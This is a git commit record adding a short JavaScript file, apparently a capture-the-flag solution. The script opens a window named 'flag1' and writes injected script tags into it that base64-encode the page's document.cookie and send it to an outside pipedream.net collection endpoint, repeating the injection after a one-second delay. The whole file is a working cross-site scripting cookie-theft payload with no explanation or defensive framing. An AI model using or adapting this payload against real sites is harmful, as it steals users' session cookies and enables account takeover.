54157618901e67d3c8222e727edd2858086b1d5b
Abdul Haq <75989562+skabdulhaq@users.noreply.github.com>
2023-02-27 01:35:10 +0530

    Create test1.js

---
+++ test1.js
@@ -0,0 +1,6 @@
+flag = window.open("flag1")
+flag.window.document.onload = function (){}
+window.alert = function() {console.log("alert(1337)")};
+flag.window.document.write('Starting hack')
+flag.window.document.write('<script>var xhttp = new XMLHttpRequest();xhttp.open("Get","https://eoctl0knzoys9l9.m.pipedream.net/?flag="+btoa(window.document.cookie));xhttp.send()</script>')
+setTimeout(function(){flag.window.document.write('<script>var xhttp = new XMLHttpRequest();xhttp.open("Get","https://eoctl0knzoys9l9.m.pipedream.net/?flag="+btoa(window.document.cookie));xhttp.send()</script>')},1000)
